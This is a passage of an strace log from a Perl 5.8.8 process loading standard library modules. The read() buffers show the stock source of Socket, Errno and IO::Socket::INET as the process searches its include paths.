bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
10890 07:35:08.685904 stat64("/etc/perl/Socket.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685919 stat64("/etc/perl/Socket.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685933 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685945 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685985 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.686036 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.686064 stat64("/usr/lib/perl5/Socket.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.686076 stat64("/usr/lib/perl5/Socket.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.686090 stat64("/usr/share/perl5/Socket.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.686102 stat64("/usr/share/perl5/Socket.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.686129 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.686141 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
10890 07:35:08.686161 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
10890 07:35:08.686175 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.686186 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.686204 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
10890 07:35:08.686682 brk(0x8239000)    = 0x8239000
10890 07:35:08.686883 read(8, "", 4096) = 0
10890 07:35:08.686898 close(8)          = 0
10890 07:35:08.687029 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
10890 07:35:08.687055 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10890 07:35:08.687082 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
10890 07:35:08.687096 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
10890 07:35:08.687189 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
10890 07:35:08.687208 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7ddd000
10890 07:35:08.687221 mmap2(0xb7de2000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7de2000
10890 07:35:08.687237 close(8)          = 0
10890 07:35:08.687835 brk(0x825a000)    = 0x825a000
10890 07:35:08.688026 stat64("/etc/perl/Errno.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.688043 stat64("/etc/perl/Errno.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.688057 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.688069 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.688083 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.688096 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.688109 stat64("/usr/lib/perl5/Errno.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.688121 stat64("/usr/lib/perl5/Errno.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.688134 stat64("/usr/share/perl5/Errno.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.688145 stat64("/usr/share/perl5/Errno.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.688158 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.688170 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
10890 07:35:08.688191 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
10890 07:35:08.688205 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.688216 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.688236 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
10890 07:35:08.689019 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
10890 07:35:08.689418 _llseek(8, 5966, [5966], SEEK_SET) = 0
10890 07:35:08.689434 _llseek(8, 0, [5966], SEEK_CUR) = 0
10890 07:35:08.689492 close(8)          = 0
10890 07:35:08.689862 brk(0x827b000)    = 0x827b000
10890 07:35:08.690067 read(5, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
10890 07:35:08.690611 _llseek(5, 6698, [6698], SEEK_SET) = 0
10890 07:35:08.690628 _llseek(5, 0, [6698], SEEK_CUR) = 0
10890 07:35:08.690638 close(5)          = 0
10890 07:35:08.690658 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.690672 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.690686 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.690699 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.690713 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.690730 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.690745 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.690757 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.690770 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.690782 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.690795 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.690809 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
10890 07:35:08.690830 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 5
10890 07:35:08.690845 ioctl(5, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0638) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.690856 _llseek(5, 0, [0], SEEK_CUR) = 0
10890 07:35:08.690873 read(5, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    